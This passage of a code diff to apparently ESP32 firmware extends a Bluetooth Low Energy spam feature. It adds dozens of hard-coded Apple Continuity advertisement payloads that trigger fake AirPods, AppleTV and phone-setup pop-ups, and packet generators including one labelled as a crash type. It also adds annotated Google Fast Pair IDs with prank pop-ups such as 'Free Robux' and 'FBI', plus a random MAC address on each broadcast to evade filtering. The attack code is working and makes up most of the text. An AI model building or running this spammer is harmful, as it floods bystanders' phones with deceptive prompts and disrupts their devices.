@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include "esp_heap_caps.h"  // Add this include at the top if not already present
 #ifndef CONFIG_IDF_TARGET_ESP32S2
 #include "core/callbacks.h"
 #include "esp_random.h"
@@ -38,6 +39,11 @@ static const char *TAG_BLE = "BLE_MANAGER";
 static int airTagCount = 0;
 static bool ble_initialized = false;
 static esp_timer_handle_t flush_timer = NULL;
+static TaskHandle_t nimble_host_task_handle = NULL;
+
+// Forward declarations
+static void generate_random_mac(uint8_t *mac_addr);
+static void restart_ble_stack(void);
 
 typedef struct {
     ble_data_handler_t handler;
@@ -72,15 +78,103 @@ static TaskHandle_t spam_task_handle = NULL;
 static volatile bool spam_running = false;
 static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;
 
-// spam payload data
+// Apple Continuity Protocol Support
+typedef enum {
+    CONTINUITY_TYPE_PROXIMITY_PAIR = 0x07,
+    CONTINUITY_TYPE_NEARBY_ACTION = 0x0F,
+    CONTINUITY_TYPE_CUSTOM_CRASH = 0x0F  // Same as nearby action but with special payload
+} continuity_type_t;
+
+typedef struct {
+    uint16_t model;
+    const char* name;
+    uint8_t colors[8];  // Up to 8 color options per device
+    uint8_t color_count;
+} apple_device_t;
+
+// Apple/Beats device models with colors
+static const apple_device_t apple_devices[] = {
+    {0x0E20, "AirPods Pro", {0x00}, 1},
+    {0x0A20, "AirPods Max", {0x00, 0x02, 0x03, 0x0F, 0x11}, 5},
+    {0x0055, "AirTag", {0x00}, 1},
+    {0x0030, "Hermes AirTag", {0x00}, 1},
+    {0x0220, "AirPods", {0x00}, 1},
+    {0x0F20, "AirPods 2nd Gen", {0x00}, 1},
+    {0x1320, "AirPods 3rd Gen", {0x00}, 1},
+    {0x1420, "AirPods Pro 2nd Gen", {0x00}, 1},
+    {0x1020, "Beats Flex", {0x00, 0x01}, 2},
+    {0x0620, "Beats Solo 3", {0x00, 0x01, 0x06, 0x07, 0x08, 0x09, 0x0E, 0x0F}, 8},
+    {0x0320, "Powerbeats 3", {0x00, 0x01, 0x0B, 0x0C, 0x0D, 0x12, 0x13, 0x14}, 8},
+    {0x0B20, "Powerbeats Pro", {0x00, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0B, 0x0D}, 8},
+    {0x0C20, "Beats Solo Pro", {0x00, 0x01}, 2},
+    {0x1120, "Beats Studio Buds", {0x00, 0x01, 0x02, 0x03, 0x04, 0x06}, 6},
+    {0x0520, "Beats X", {0x00, 0x01, 0x02, 0x05, 0x1D, 0x25}, 6},
+    {0x0920, "Beats Studio 3", {0x00, 0x01, 0x02, 0x03, 0x18, 0x19, 0x25, 0x26}, 8},
+    {0x1720, "Beats Studio Pro", {0x00, 0x01}, 2},
+    {0x1220, "Beats Fit Pro", {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}, 8},
+    {0x1620, "Beats Studio Buds+", {0x00, 0x01, 0x02, 0x03, 0x04}, 5}
+};
+
+// Nearby Action types
+static const struct {
+    uint8_t action;
+    const char* name;
+} nearby_actions[] = {
+    {0x13, "AppleTV AutoFill"},
+    {0x24, "Apple Vision Pro"},
+    {0x05, "Apple Watch"},
+    {0x27, "AppleTV Connecting..."},
+    {0x20, "Join This AppleTV?"},
+    {0x19, "AppleTV Audio Sync"},
+    {0x1E, "AppleTV Color Balance"},
+    {0x09, "Setup New iPhone"},
+    {0x2F, "Sign in to other device"},
+    {0x02, "Transfer Phone Number"},
+    {0x0B, "HomePod Setup"},
+    {0x01, "Setup New AppleTV"},
+    {0x06, "Pair AppleTV"},
+    {0x0D, "HomeKit AppleTV Setup"},
+    {0x2B, "AppleID for AppleTV?"}
+};
+
+#define APPLE_DEVICES_COUNT (sizeof(apple_devices) / sizeof(apple_devices[0]))
+#define NEARBY_ACTIONS_COUNT (sizeof(nearby_actions) / sizeof(nearby_actions[0]))
+
+// AppleJuice Payload Data - proper device IDs
 const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 
-    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+    /* Airpods */ 0x02,
+    /* AirpodsPro */ 0x0e,
+    /* AirpodsMax */ 0x0a,
+    /* AirpodsGen2 */ 0x0f,
+    /* AirpodsGen3 */ 0x13,
+    /* AirpodsProGen2 */ 0x14,
+    /* PowerBeats */ 0x03,
+    /* PowerBeatsPro */ 0x0b,
+    /* BeatsSoloPro */ 0x0c,
+    /* BeatsStudioBuds */ 0x11,
+    /* BeatsFlex */ 0x10,
+    /* BeatsX */ 0x05,
+    /* BeatsSolo3 */ 0x06,
+    /* BeatsStudio3 */ 0x09,
+    /* BeatsStudioPro */ 0x17,
+    /* BeatsFitPro */ 0x12,
+    /* BeatsStdBudsPlus */ 0x16,
 };
 
 const uint8_t IOS2[] = {
-    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
-    0x0b, 0x09, 0x02, 0x1e, 0x24
+    /* AppleTVSetup */ 0x01,
+    /* AppleTVPair */ 0x06,
+    /* AppleTVNewUser */ 0x20,
+    /* AppleTVAppleIDSetup */ 0x2b,
+    /* AppleTVWirelessAudioSync */ 0xc0,
+    /* AppleTVHomekitSetup */ 0x0d,
+    /* AppleTVKeyboard */ 0x13,
+    /* AppleTVConnectingNetwork */ 0x27,
+    /* HomepodSetup */ 0x0b,
+    /* SetupNewPhone */ 0x09,
+    /* TransferNumber */ 0x02,
+    /* TVColorBalance */ 0x1e,
+    /* AppleVisionPro */ 0x24,
 };
 
 typedef struct {
@@ -88,33 +182,179 @@ typedef struct {
 } DeviceType;
 
 const DeviceType android_models[] = {
-    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, 
-    {0x000007}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, 
-    {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7},
-    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, 
-    {0x0002F0}, {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, 
-    {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205},
-    {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963}, 
-    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, 
-    {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, 
-    {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, 
-    {0x0660D7}, {0x0103F0}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, 
-    {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, 
-    {0xE2106F}, {0xB37A62}, {0x92ADC9}
+    // Genuine non-production/forgotten devices
+    {0x0001F0}, // Bisto CSR8670 Dev Board
+    {0x000047}, // Arduino 101
+    {0x470000}, // Arduino 101 2
+    {0x00000A}, // Anti-Spoof Test
+    {0x00000B}, // Google Gphones
+    {0x00000D}, // Test 00000D
+    {0x000007}, // Android Auto
+    {0x000009}, // Test Android TV
+    {0x090000}, // Test Android TV 2
+    {0x000048}, // Fast Pair Headphones
+    {0x001000}, // LG HBS1110
+    {0x00B727}, // Smart Controller 1
+    {0x01E5CE}, // BLE-Phone
+    {0x0200F0}, // Goodyear
+    {0x00F7D4}, // Smart Setup
+    {0xF00002}, // Goodyear
+    {0xF00400}, // T10
+    {0x1E89A7}, // ATS2833_EVB
+
+    // Genuine devices
+    {0xCD8256}, // Bose NC 700
+    {0x0000F0}, // Bose QuietComfort 35 II
+    {0xF00000}, // Bose QuietComfort 35 II 2
+    {0x821F66}, // JBL Flip 6
+    {0xF52494}, // JBL Buds Pro
+    {0x718FA4}, // JBL Live 300TWS
+    {0x0002F0}, // JBL Everest 110GA
+    {0x92BBBD}, // Pixel Buds
+    {0x000006}, // Google Pixel buds
+    {0x060000}, // Google Pixel buds 2
+    {0xD446A7}, // Sony XM5
+    {0x038B91}, // DENON AH-C830NCW
+    {0x02F637}, // JBL LIVE FLEX
+    {0x02D886}, // JBL REFLECT MINI NC
+    {0xF00001}, // Bose QuietComfort 35 II
+    {0xF00201}, // JBL Everest 110GA
+    {0xF00209}, // JBL LIVE400BT
+    {0xF00205}, // JBL Everest 310GA
+    {0xF00305}, // LG HBS-1500
+    {0xF00E97}, // JBL VIBE BEAM
+    {0x04ACFC}, // JBL WAVE BEAM
+    {0x04AA91}, // Beoplay H4
+    {0x04AFB8}, // JBL TUNE 720BT
+    {0x05A963}, // WONDERBOOM 3
+    {0x05AA91}, // B&O Beoplay E6
+    {0x05C452}, // JBL LIVE220BT
+    {0x05C95C}, // Sony WI-1000X
+    {0x0602F0}, // JBL Everest 310GA
+    {0x0603F0}, // LG HBS-1700
+    {0x1E8B18}, // SRS-XB43
+    {0x1E955B}, // WI-1000XM2
+    {0x1EC95C}, // Sony WF-SP700N
+    {0x06AE20}, // Galaxy S21 5G
+    {0x06C197}, // OPPO Enco Air3 Pro
+    {0x06C95C}, // Sony WH-1000XM2
+    {0x06D8FC}, // soundcore Liberty 4 NC
+    {0x0744B6}, // Technics EAH-AZ60M2
+    {0x07A41C}, // WF-C700N
+    {0x07C95C}, // Sony WH-1000XM2
+    {0x07F426}, // Nest Hub Max
+    {0x0102F0}, // JBL Everest 110GA - Gun Metal
+    {0x054B2D}, // JBL TUNE125TWS
+    {0x0660D7}, // JBL LIVE770NC
+    {0x0103F0}, // LG HBS-835
+    {0x0903F0}, // LG HBS-2000
+
+    // Custom debug popups
+    {0xD99CA1}, // Flipper Zero
+    {0x77FF67}, // Free Robux
+    {0xAA187F}, // Free VBucks
+    {0xDCE9EA}, // Rickroll
+    {0x87B25F}, // Animated Rickroll
+    {0x1448C9}, // BLM
+    {0x13B39D}, // Talking Sasquach
+    {0x7C6CDB}, // Obama
+    {0x005EF9}, // Ryanair
+    {0xE2106F}, // FBI
+    {0xB37A62}, // Tesla
+    {0x92ADC9}, // Ton Upgrade Netflix
 };
 
 typedef struct {
     uint8_t value;
+    const char* name;
 } WatchModel;
 
 const WatchModel watch_models[] = {
-    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, 
-    {0x08}, {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, 
-    {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, 
-    {0x1E}, {0x20}
+    {0x1A, "Fallback Watch"},
+    {0x01, "White Watch4 Classic 44m"},
+    {0x02, "Black Watch4 Classic 40m"},
+    {0x03, "White Watch4 Classic 40m"},
+    {0x04, "Black Watch4 44mm"},
+    {0x05, "Silver Watch4 44mm"},
+    {0x06, "Green Watch4 44mm"},
+    {0x07, "Black Watch4 40mm"},
+    {0x08, "White Watch4 40mm"},
+    {0x09, "Gold Watch4 40mm"},
+    {0x0A, "French Watch4"},
+    {0x0B, "French Watch4 Classic"},
+    {0x0C, "Fox Watch5 44mm"},
+    {0x11, "Black Watch5 44mm"},
+    {0x12, "Sapphire Watch5 44mm"},
+    {0x13, "Purpleish Watch5 40mm"},
+    {0x14, "Gold Watch5 40mm"},
+    {0x15, "Black Watch5 Pro 45mm"},
+    {0x16, "Gray Watch5 Pro 45mm"},
+    {0x17, "White Watch5 44mm"},
+    {0x18, "White & Black Watch5"},
+    {0x1B, "Black Watch6 Pink 40mm"},
+    {0x1C, "Gold Watch6 Gold 40mm"},
+    {0x1D, "Silver Watch6 Cyan 44mm"},
+    {0x1E, "Black Watch6 Classic 43m"},
+    {0x20, "Green Watch6 Classic 43m"},
 };
 
-static void spam_log_timer_cb(void *arg) {
+// Apple Continuity Protocol packet generators
+static void generate_proximity_pair_packet(uint8_t* adv_data, size_t* adv_len, uint16_t device_model, uint8_t color) {
+    *adv_len = 0;
+    
+    // Flags
+    adv_data[(*adv_len)++] = 0x02; // Length
+    adv_data[(*adv_len)++] = 0x01; // Type: Flags
+    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
+    
+    // Apple Continuity Service Data
+    adv_data[(*adv_len)++] = 0x1A; // Length (26 bytes)
+    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
+    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
+    adv_data[(*adv_len)++] = 0xFE; 
+    
+    // Continuity Header
+    adv_data[(*adv_len)++] = CONTINUITY_TYPE_PROXIMITY_PAIR; // Type: Proximity Pair
+    adv_data[(*adv_len)++] = 0x15; // Length of data
+    adv_data[(*adv_len)++] = 0x01; // Status flags
+    
+    // Device Model (little endian)
+    adv_data[(*adv_len)++] = device_model & 0xFF;
+    adv_data[(*adv_len)++] = (device_model >> 8) & 0xFF;
+    
+    // Status and Color
+    adv_data[(*adv_len)++] = 0x00; // Status
+    adv_data[(*adv_len)++] = color; // Color
+    
+    // Random data (encrypted payload simulation)
+    for (int i = 0; i < 16; i++) {
+        adv_data[(*adv_len)++] = esp_random() & 0xFF;
+    }
+}
+
+static void generate_nearby_action_packet(uint8_t* adv_data, size_t* adv_len, uint8_t action_type) {
+    *adv_len = 0;
+    
+    // Flags
+    adv_data[(*adv_len)++] = 0x02; // Length
+    adv_data[(*adv_len)++] = 0x01; // Type: Flags
+    adv_data[(*adv_len)++] = 0x1A; // LE General Discoverable + BR/EDR Not Supported
+    
+    // Apple Continuity Service Data
+    adv_data[(*adv_len)++] = 0x08; // Length (8 bytes)
+    adv_data[(*adv_len)++] = 0x16; // Type: Service Data
+    adv_data[(*adv_len)++] = 0xD2; // Apple Continuity Service UUID (0x004C)
+    adv_data[(*adv_len)++] = 0xFE;
+    
+    // Continuity Header
+    adv_data[(*adv_len)++] = CONTINUITY_TYPE_NEARBY_ACTION; // Type: Nearby Action
+    adv_data[(*adv_len)++] = 0x03; // Length of data
+    adv_data[(*adv_len)++] = action_type; // Action type
+    adv_data[(*adv_len)++] = 0x00; // Action flags
+    adv_data[(*adv_len)++] = 0x00; // Authentication tag
+}
+
+static void spam_log_timer_cb(TimerHandle_t xTimer) {
     const char *type_name = "unknown";
     switch (current_spam_type) {
         case BLE_SPAM_APPLE: type_name = "apple"; break;
@@ -138,8 +378,32 @@ static void build_google_mfg(uint8_t *buf, size_t *len);
 static void spam_task(void *arg) {
     while (spam_running) {
         if (ble_gap_adv_active()) {
-            ble_gap_adv_stop();
+            int rc = ble_gap_adv_stop();
+            if (rc != 0) {
+                ESP_LOGW(TAG_BLE, "Failed to stop advertising: %d", rc);
+            }
         }
+        
+        vTaskDelay(pdMS_TO_TICKS(50));
+
+        if (ble_gap_adv_active()) {
+            ble_gap_adv_stop();
+            vTaskDelay(pdMS_TO_TICKS(20));
+        }
+
+        if (current_spam_type != BLE_SPAM_APPLE) {
+            uint8_t rnd_addr[6];
+            generate_random_mac(rnd_addr);
+            int rc = ble_hs_id_set_rnd(rnd_addr);
+            if (rc != 0) {
+                ESP_LOGW(TAG_BLE, "Failed to set random address: %d", rc);
+            } else {
+                ESP_LOGD(TAG_BLE, "Set random MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+                         rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+            }
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(10));
 
         struct ble_hs_adv_fields fields;
         memset(&fields, 0, sizeof(fields));
@@ -147,13 +411,123 @@ static void spam_task(void *arg) {
 
         uint8_t mfg_buf[31];
         size_t mfg_len = 0;
+        uint8_t full_adv[31];
+        size_t full_adv_len = 0;
+        int use_full_adv = 0;
 
         if (current_spam_type == BLE_SPAM_MICROSOFT) {
             char name[8];
             generate_random_name(name, sizeof(name));
             build_microsoft_mfg(name, mfg_buf, &mfg_len);
         } else if (current_spam_type == BLE_SPAM_APPLE) {
-            build_apple_mfg(mfg_buf, &mfg_len);
+            // Use AppleJuice preset adv structures
+            static const uint8_t dataAirpods[31]             = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAirpodsPro[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAirpodsMax[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAirpodsGen2[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAirpodsGen3[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAirpodsProGen2[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataPowerBeats[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataPowerBeatsPro[31]       = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsSoloPro[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsStudioBuds[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsFlex[31]           = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsX[31]              = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsSolo3[31]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsStudio3[31]        = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsStudioPro[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsFitPro[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataBeatsStudioBudsPlus[31] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVSetup[23]        = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVPair[23]         = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVNewUser[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVAppleIDSetup[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x2b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVWirelessAudioSync[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0xc0,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVHomekitSetup[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVKeyboard[23]     = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataAppleTVConnectingToNetwork[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataHomepodSetup[23]        = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataSetupNewPhone[23]       = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataTransferNumber[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+            static const uint8_t dataTVColorBalance[23]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
+
+            const uint8_t *sel = NULL;
+            size_t sel_len = 0;
+
+            static const uint8_t *apple_adv_payloads[] = {
+                dataAirpods,
+                dataAirpodsPro,
+                dataAirpodsMax,
+                dataAirpodsGen2,
+                dataAirpodsGen3,
+                dataAirpodsProGen2,
+                dataPowerBeats,
+                dataPowerBeatsPro,
+                dataBeatsSoloPro,
+                dataBeatsStudioBuds,
+                dataBeatsFlex,
+                dataBeatsX,
+                dataBeatsSolo3,
+                dataBeatsStudio3,
+                dataBeatsStudioPro,
+                dataBeatsFitPro,
+                dataBeatsStudioBudsPlus,
+                dataAppleTVSetup,
+                dataAppleTVPair,
+                dataAppleTVNewUser,
+                dataAppleTVAppleIDSetup,
+                dataAppleTVWirelessAudioSync,
+                dataAppleTVHomekitSetup,
+                dataAppleTVKeyboard,
+                dataAppleTVConnectingToNetwork,
+                dataHomepodSetup,
+                dataSetupNewPhone,
+                dataTransferNumber,
+                dataTVColorBalance
+            };
+            static const size_t apple_adv_sizes[] = {
+                sizeof(dataAirpods),
+                sizeof(dataAirpodsPro),
+                sizeof(dataAirpodsMax),
+                sizeof(dataAirpodsGen2),
+                sizeof(dataAirpodsGen3),
+                sizeof(dataAirpodsProGen2),
+                sizeof(dataPowerBeats),
+                sizeof(dataPowerBeatsPro),
+                sizeof(dataBeatsSoloPro),
+                sizeof(dataBeatsStudioBuds),
+                sizeof(dataBeatsFlex),
+                sizeof(dataBeatsX),
+                sizeof(dataBeatsSolo3),
+                sizeof(dataBeatsStudio3),
+                sizeof(dataBeatsStudioPro),
+                sizeof(dataBeatsFitPro),
+                sizeof(dataBeatsStudioBudsPlus),
+                sizeof(dataAppleTVSetup),
+                sizeof(dataAppleTVPair),
+                sizeof(dataAppleTVNewUser),
+                sizeof(dataAppleTVAppleIDSetup),
+                sizeof(dataAppleTVWirelessAudioSync),
+                sizeof(dataAppleTVHomekitSetup),
+                sizeof(dataAppleTVKeyboard),
+                sizeof(dataAppleTVConnectingToNetwork),
+                sizeof(dataHomepodSetup),
+                sizeof(dataSetupNewPhone),
+                sizeof(dataTransferNumber),
+                sizeof(dataTVColorBalance)
+            };
+            uint32_t apple_adv_count = sizeof(apple_adv_payloads) / sizeof(apple_adv_payloads[0]);
+            uint32_t idx = esp_random() % apple_adv_count;
+            sel = apple_adv_payloads[idx];
+            sel_len = apple_adv_sizes[idx];
+
+            if (sel && sel_len > 0 && sel_len <= sizeof(full_adv)) {
+                memcpy(full_adv, sel, sel_len);
+                full_adv_len = sel_len;
+                use_full_adv = 1;
+            } else {
+                continue;
+            }
         } else if (current_spam_type == BLE_SPAM_SAMSUNG) {
             build_samsung_mfg(mfg_buf, &mfg_len);
         } else if (current_spam_type == BLE_SPAM_GOOGLE) {
@@ -165,7 +539,61 @@ static void spam_task(void *arg) {
                 generate_random_name(name, sizeof(name));
                 build_microsoft_mfg(name, mfg_buf, &mfg_len);
             } else if (rand_type == 1) {
-                build_apple_mfg(mfg_buf, &mfg_len);
+                uint8_t adv_data[31];
+                size_t adv_len = 0;
+                
+                if (esp_random() % 2 == 0) {
+                    uint32_t device_idx = esp_random() % APPLE_DEVICES_COUNT;
+                    const apple_device_t* device = &apple_devices[device_idx];
+                    uint8_t color = device->colors[esp_random() % device->color_count];
+                    generate_proximity_pair_packet(adv_data, &adv_len, device->model, color);
+                } else {
+                    uint32_t action_idx = esp_random() % NEARBY_ACTIONS_COUNT;
+                    uint8_t action_type = nearby_actions[action_idx].action;
+                    generate_nearby_action_packet(adv_data, &adv_len, action_type);
+                }
+                
+                if (adv_len >= 9) {
+                    uint8_t* service_data_start = NULL;
+                    size_t remaining = adv_len - 3;
+                    uint8_t* ptr = &adv_data[3];
+                    
+                    while (remaining > 0) {
+                        uint8_t len = ptr[0];
+                        uint8_t type = ptr[1];
+                        
+                        if (type == 0x16 && len >= 4) {
+                            if (ptr[2] == 0xD2 && ptr[3] == 0xFE) {
+                                service_data_start = &ptr[4];
+                                break;
+                            }
+                        }
+                        
+                        ptr += len + 1;
+                        remaining -= len + 1;
+                    }
+                    
+                    if (service_data_start && (service_data_start - adv_data) < adv_len) {
+                        mfg_buf[0] = 0x4C;
+                        mfg_buf[1] = 0x00;
+                        
+                        size_t continuity_data_len = adv_len - (service_data_start - adv_data);
+                        if (continuity_data_len <= sizeof(mfg_buf) - 2) {
+                            memcpy(&mfg_buf[2], service_data_start, continuity_data_len);
+                            mfg_len = continuity_data_len + 2;
+                        } else {
+                            ESP_LOGW(TAG_BLE, "Random Apple Continuity data too large, truncating");
+                            memcpy(&mfg_buf[2], service_data_start, sizeof(mfg_buf) - 2);
+                            mfg_len = sizeof(mfg_buf);
+                        }
+                    } else {
+                        ESP_LOGE(TAG_BLE, "Could not find random Apple Continuity service data");
+                        continue;
+                    }
+                } else {
+                    ESP_LOGE(TAG_BLE, "Invalid random Apple Continuity packet size: %zu", adv_len);
+                    continue;
+                }
             } else if (rand_type == 2) {
                 build_samsung_mfg(mfg_buf, &mfg_len);
             } else {
@@ -173,29 +601,81 @@ static void spam_task(void *arg) {
             }
         }
 
-        fields.mfg_data = mfg_buf;
-        fields.mfg_data_len = mfg_len;
+        // build raw advertisement data
+        uint8_t adv_data[31];
+        size_t adv_len = 0;
 
-        if (ble_gap_adv_set_fields(&fields) == 0) {
